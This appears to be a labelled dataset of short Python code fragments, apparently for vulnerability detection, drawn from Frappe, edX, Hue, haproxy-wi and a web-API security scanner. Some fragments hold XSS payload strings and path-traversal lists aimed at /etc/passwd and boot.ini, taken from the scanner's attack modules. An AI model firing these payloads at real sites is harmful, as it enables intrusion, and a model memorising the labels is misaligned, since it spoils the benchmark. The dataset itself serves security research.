msg={\"status\": scanid", "label": 0}, {"snippet_id": 40960, "code": " BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route", "label": 0}, {"snippet_id": 37462, "code": "\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context", "label": 1}, {"snippet_id": 14810, "code": " name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite", "label": 0}, {"snippet_id": 11148, "code": " servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt", "label": 0}, {"snippet_id": 10942, "code": "): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY", "label": 0}, {"snippet_id": 35788, "code": "}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError", "label": 0}, {"snippet_id": 4319, "code": "/img>\" % self.url return payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' %", "label": 1}, {"snippet_id": 21442, "code": "<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\")", "label": 0}, {"snippet_id": 2011, "code": "\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact", "label": 0}, {"snippet_id": 10433, "code": " TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self):", "label": 0}, {"snippet_id": 39724, "code": " docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) ", "label": 0}, {"snippet_id": 1364, "code": "'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': data['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']:", "label": 0}, {"snippet_id": 45157, "code": ".user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) workflows=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document", "label": 0}, {"snippet_id": 24317, "code": " report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly ", "label": 0}, {"snippet_id": 40255, "code": ", value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t", "label": 0}, {"snippet_id": 23662, "code": ".test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase):", "label": 0}, {"snippet_id": 33464, "code": "(re.escape(sig), response) \t\t\t\tif match and any(x in payload for x in \"><\"): \t\t\t\t\tself.found(injection_types, url, parameter, payload) \t\t\t\t\treturn True \t\treturn False \t \tdef signature(self): \t\treturn{\"XSS", "label": 1}, {"snippet_id": 686, "code": ",body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs", "label": 0}, {"snippet_id": 26025, "code": "{ 'is_business': '' } def __init__(self, *args, **kwargs): self.event=event=kwargs.pop('event') self.request=kwargs.pop('request', None) self.validate_vat_id=kwargs.pop('validate_vat_id') self.all_optional", "label": 0}, {"snippet_id": 23512, "code": ", 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^", "label": 0}, {"snippet_id": 33163, "code": "\"Updates buckets from configs.\"\"\" @decorators.require_cronjob def get(self): config.cron_update_buckets() class BuildRPCHandler(webapp2.RequestHandler): \"\"\"Redirects to API explorer to see the build.\"\"", "label": 0}, {"snippet_id": 4873, "code": ":text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\", ]", "label": 1}, {"snippet_id": 6395, "code": " @property def ssl_adapter(self): \"\"\" CherryPy SSL adapter class to use(must be one of cherrypy.wsgiserver.ssl_adapters) \"\"\" return self.config.get(self.section, 'ssl_adapter') @property def server_cert(self)", "label": 0}, {"snippet_id": 39422, "code": "'name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in", "label": 0}, {"snippet_id": 14532, "code": ": paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure", "label": 0}, {"snippet_id": 53018, "code": " json.dumps(workflows), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator", "label": 1}, {"snippet_id": 45667, "code": ".objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']]) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) bundle_doc.dependencies", "label": 0}, {"snippet_id": 13691, "code": "]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book", "label": 1}, {"snippet_id": 26508, "code": "'%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "label": 0}, {"snippet_id": 27319, "code": " import json import logging import os import re import sys import traceback import urllib.parse import jinja2 import webapp2 from base import utils from config import db_config from config import local_config", "label": 0}, {"snippet_id": 18894, "code": "/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity", "label": 0}, {"snippet_id": 2432, "code": "-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers", "label": 0}, {"snippet_id": 25470, "code": " defaults['label']=label field=forms.CharField(**defaults) field.part_name=fname fields.append(field) super().__init__( fields=fields, require_all_fields=False, *args, **kwargs ) self.require_all_fields", "label": 0}, {"snippet_id": 42598, "code": ".label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp'", "label": 0}, {"snippet_id": 47116, "code": ".dumps(m.json, indent=2, sort_keys=True))) ) column_filters=('created', 'updated',) column_default_sort=('updated', True) page_size=25 def delete_model(self, model): \"\"\"Delete a record.\"\"\" try: if model", "label": 1}, {"snippet_id": 11959, "code": "(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include", "label": 0}, {"snippet_id": 25019, "code": "{'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course", "label": 0}, {"snippet_id": 2694, "code": "=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact", "label": 0}, {"snippet_id": 30297, "code": " haproxy_pass)) \t if serv is not None and act==\"stats\": \timport requests \tfrom requests_toolbelt.utils import dump \t \thaproxy_user=sql.get_setting('stats_user') \thaproxy_pass=sql.get_setting('stats_password')", "label": 0}, {"snippet_id": 55124, "code": " editing\" ) active_translations=Translation.objects.filter( active=True, locale=locale, entity__in=entities, ) action_function=ACTIONS_FN_MAP[form.cleaned_data['action']] action_status=action_function(", "label": 0}, {"snippet_id": 27264, "code": " print \"[-] Invalid target\" exit() m=re.match(r'(http|https):\\/\\/([^\\/]+)', url, re.I|re.M) if m: host=m.group(2) else: print \"[-] Can't get host information\" exit() print \"[+] Host acquired \" +host print", "label": 0}, {"snippet_id": 3045, "code": " import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1", "label": 0}, {"snippet_id": 47859, "code": ") if request.POST.get(\"active\"): user.active=magic.parse_bool(request.POST[\"active\"]) au: User=user.authuser if check_password_conformity(pw1, pw2): logging.log(logging.INFO, \"Set password for user: \" ", "label": 0}, {"snippet_id": 22240, "code": "\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout')", "label": 0}, {"snippet_id": 46706, "code": " entry_form_config: flag=form.cleaned_data.get(str(question['id']), False) if flag: selected_flags.append(getattr(BenefitRequirement.flags, build_question_flag(question))) return self.render_to_response({ 'form'", "label": 0}, {"snippet_id": 45163, "code": "(smart_str(e)) workflows=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not", "label": 0}, {"snippet_id": 1114, "code": ".headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except", "label": 0}, {"snippet_id": 26761, "code": "./../../../../boot.ini%00', '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00', '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 34882, "code": " no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", ", "label": 0}, {"snippet_id": 33655, "code": ".content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse", "label": 0}, {"snippet_id": 52017, "code": " Credentials from liboozie.oozie_api import get_oozie from liboozie.submission2 import Submission from oozie.decorators import check_document_access_permission, check_document_modify_permission from oozie", "label": 0}, {"snippet_id": 29160, "code": "+tmp_config_path+script+\" && \" +tmp_config_path+script +\" PROXY=\" +proxy+ \t\t\t\t\" HAPROXY_PATH=\"+haproxy_dir +\" VERSION=\"+ver] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error", "label": 0}, {"snippet_id": 55083, "code": " if not entities.exists(): return JsonResponse({'count': 0}) projects_pk=entities.values_list('resource__project__pk', flat=True) projects=Project.objects.filter(pk__in=projects_pk.distinct()) for project", "label": 0}, {"snippet_id": 12796, "code": ".course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid", "label": 0}, {"snippet_id": 51049, "code": "(PeriodicTaskForm, self).clean() return cleaned_data class IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin): list_display=('name_safe', 'enabled', 'interval', 'crontab', 'next', 'due', 'precise',", "label": 0}, {"snippet_id": 20779, "code": ".password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url", "label": 0}, {"snippet_id": 27634, "code": " to response.\"\"\" self.response.headers['Strict-Transport-Security']=( 'max-age=2592000; includeSubdomains') self.response.headers['X-Content-Type-Options']='nosniff' self.response.headers['X-Frame-Options", "label": 0}, {"snippet_id": 30562, "code": " \tif serv=='haproxy-wi.access.log': \t\tcmd=\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \telse: \t\tcmd=\"cat %s| awk", "label": 0}, {"snippet_id": 4114, "code": ": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse", "label": 0}, {"snippet_id": 30810, "code": "/show_compare_configs.html') \tleft=form.getvalue('left') \tright=form.getvalue('right') \t \ttemplate=template.render(serv=serv, right=right, left=left, return_files=funct.get_files())\t\t\t\t\t\t\t\t\t \tprint(template) \t if serv", "label": 0}, {"snippet_id": 14662, "code": "=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite", "label": 0}, {"snippet_id": 15102, "code": " call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls", "label": 0}, {"snippet_id": 20905, "code": "', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {", "label": 0}, {"snippet_id": 26670, "code": "/../../../../boot.ini', '../../../../../../../../boot.ini', '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 43805, "code": " \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to", "label": 0}, {"snippet_id": 30290, "code": "+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass)) \t if serv is not None and act==\"stats\": \timport requests \tfrom requests_toolbelt.utils import dump \t \thaproxy_user", "label": 0}, {"snippet_id": 25948, "code": ".meta_info_data for r, response in sorted(responses, key=lambda r: str(r[0])): for key, value in response.items(): self.fields[key]=value value.initial=data.get('question_form_data',{}).get(key) class BaseInvoiceAddressForm", "label": 0}, {"snippet_id": 26028, "code": " def __init__(self, *args, **kwargs): self.event=event=kwargs.pop('event') self.request=kwargs.pop('request', None) self.validate_vat_id=kwargs.pop('validate_vat_id') self.all_optional=kwargs.pop('all_optional", "label": 0}, {"snippet_id": 7596, "code": "\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^", "label": 1}, {"snippet_id": 53241, "code": ":editor_submit_coordinator', kwargs={'doc_id': coordinator.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping):", "label": 0}, {"snippet_id": 4947, "code": "'<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x", "label": 0}, {"snippet_id": 9095, "code": "/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/", "label": 1}, {"snippet_id": 33238, "code": ".create_login_url(self.request.url)) self.response.write('build %d not found' % build_id) self.abort(404) return self.redirect(str(build.url)) class TaskCancelSwarmingTask(webapp2.RequestHandler): \"\"\"Cancels", "label": 1}, {"snippet_id": 9973, "code": " this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver", "label": 0}, {"snippet_id": 13381, "code": "'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to", "label": 0}, {"snippet_id": 11744, "code": "}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware", "label": 0}, {"snippet_id": 25894, "code": "=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')), ) elif q.type==Question.TYPE_DATETIME: field=SplitDateTimeField( label=q.question, required=q.required, help_text=help_text,", "label": 0}, {"snippet_id": 43499, "code": " df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get", "label": 0}, {"snippet_id": 52803, "code": " params_form.errors)) else: parameters=workflow.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet", "label": 0}, {"snippet_id": 37315, "code": "\tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname", "label": 0}, {"snippet_id": 39214, "code": " df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is", "label": 0}, {"snippet_id": 30441, "code": ".get_setting('syslog_server_enable') \tif syslog_server_enable is None or syslog_server_enable==\"0\": \t\tlocal_path_logs=sql.get_setting('local_path_logs') \t\tsyslog_server=serv\t \t\tcommands=[ \"sudo cat %s| awk", "label": 0}, {"snippet_id": 6115, "code": " configuration. Loads configuration from an INI-file at instantiation. :param filename: string, INI-file name :param debug: boolean, default debug value :raise ValueError: if INI-file can't be parsed \"\"\"", "label": 0}, {"snippet_id": 29804, "code": " !=\"\": \t\t\tprint(\"ok\") \t\t\tsys.exit() \tsys.exit() if form.getvalue('token') is None: \tprint(\"What the fuck?! U r hacker Oo?!\") \tsys.exit() \t\t if form.getvalue('getcerts') is not None and serv is not None", "label": 0}, {"snippet_id": 31315, "code": "\t\t\tmetrics[rep_date]['curr_con']=str(i[1]) \t\t\tmetrics[rep_date]['curr_ssl_con']=str(i[2]) \t\t\tmetrics[rep_date]['sess_rate']=str(i[3]) \t\t\tmetrics[rep_date]['max_sess_rate']=str(i[4]) \t\tdf=pd.DataFrame.from_dict", "label": 0}, {"snippet_id": 9325, "code": "]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name", "label": 0}, {"snippet_id": 8731, "code": "}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views", "label": 0}, {"snippet_id": 41446, "code": " Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name", "label": 0}, {"snippet_id": 22575, "code": ".end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki", "label": 0}, {"snippet_id": 32773, "code": " FileContents-line\">' '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">' '<a name=\"%(num)s\" ' 'onclick=\"window.location.hash=%(quot)s '%(num)s</a></td>' '<td class=\"FileContents-lineContents\">%(line", "label": 0}, {"snippet_id": 9348, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary", "label": 0}, {"snippet_id": 7106, "code": " django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper", "label": 0}, {"snippet_id": 29324, "code": "\telse: \t\tif kwargs.get(\"just_save\")==\"test\": \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo rm -f \" +tmp_file] \t\telif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands=[ \"sudo haproxy -q -c -f \"", "label": 0}, {"snippet_id": 52825, "code": "/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup)", "label": 0}, {"snippet_id": 33103, "code": " from components import endpoints_webapp2 from components import prpc import webapp2 from legacy import api as legacy_api from legacy import swarmbucket_api import access import api import bq import bulkproc", "label": 0}, {"snippet_id": 25955, "code": "(r[0])): for key, value in response.items(): self.fields[key]=value value.initial=data.get('question_form_data',{}).get(key) class BaseInvoiceAddressForm(forms.ModelForm): vat_warning=False class Meta:", "label": 0}, {"snippet_id": 27586, "code": ".\"\"\" login_url=make_login_url(dest_url=self.request.url) user_email=helpers.get_user_email() if not user_email: self.redirect(login_url) return contact_string=db_config.get_value('contact_string') template_values", "label": 0}, {"snippet_id": 28812, "code": ".set_missing_host_key_policy(paramiko.AutoAddPolicy()) \ttry: \t\tif ssh_enable==1: \t\t\tk=paramiko.RSAKey.from_private_key_file(ssh_key_name) \t\t\tssh.connect(hostname=serv, port= ssh_port, username=ssh_user_name, pkey=k", "label": 0}, {"snippet_id": 15075, "code": ".cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz", "label": 0}, {"snippet_id": 36511, "code": "\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list))", "label": 0}, {"snippet_id": 15230, "code": " when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See", "label": 0}, {"snippet_id": 9745, "code": "'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',", "label": 0}, {"snippet_id": 53392, "code": " if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle", "label": 0}, {"snippet_id": 52349, "code": "}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner", "label": 0}, {"snippet_id": 39795, "code": ".get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype", "label": 0}, {"snippet_id": 28340, "code": " configparser import ConfigParser, ExtendedInterpolation \ttry: \t\tpath_config=get_app_dir()+\"/haproxy-wi.cfg\" \t\tconfig=ConfigParser(interpolation=ExtendedInterpolation()) \t\tconfig.read(path_config) \texcept", "label": 0}, {"snippet_id": 9922, "code": "('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON", "label": 0}, {"snippet_id": 3126, "code": " return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload", "label": 0}, {"snippet_id": 25394, "code": " data_list) -> dict: data={} data['_scheme']=self.scheme_name for i, value in enumerate(data_list): data[self.scheme['fields'][i][0]]=value or '' return data def __init__(self, *args, **kwargs): fields", "label": 0}, {"snippet_id": 3264, "code": ".find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross", "label": 0}, {"snippet_id": 11615, "code": "='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>", "label": 0}, {"snippet_id": 2617, "code": " parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1", "label": 0}, {"snippet_id": 35130, "code": "\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)", "label": 0}, {"snippet_id": 6850, "code": ", a user has to complete the login phase. After this time, login cannot complete because the SAMLRequest, RelayState and possibly other needed information will be forgotten. \"\"\" return self.config.getint", "label": 0}, {"snippet_id": 9926, "code": ") import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url", "label": 0}, {"snippet_id": 28642, "code": "\timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_uuid=cookie.get('uuid') \tref=os.environ.get(\"SCRIPT_NAME\") \tsql.delete_old_uuid() \t \tif user_uuid is", "label": 0}, {"snippet_id": 1783, "code": " import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=", "label": 0}, {"snippet_id": 17154, "code": "/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 949, "code": ".api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact() xss_result=True if xss_result is True: print \"%s[{0}]{1} is vulnerable to XSS%s\"", "label": 1}, {"snippet_id": 2993, "code": "+=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print 